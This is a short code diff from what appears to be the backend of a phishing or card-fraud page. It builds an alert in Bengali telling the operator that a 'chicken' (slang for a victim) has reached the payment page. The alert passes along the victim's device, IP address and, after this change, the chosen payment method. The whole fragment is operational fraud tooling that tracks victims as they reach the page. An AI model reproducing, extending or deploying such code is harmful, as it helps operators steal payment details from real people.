@@ -59,7 +59,7 @@ serve(async (req) => {
         } else {
           message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
             `-------------------\n\n` +
-            `Payment Method : Card Payment\n\n` +
+            `Payment Method : ${method || 'Card Payment'}\n\n` +
             `-------------------\n\n` +
             `🐔মুরগির Device : ${device}\n` +
             `🐔মুরগির IP : ${clientIp}\n` +
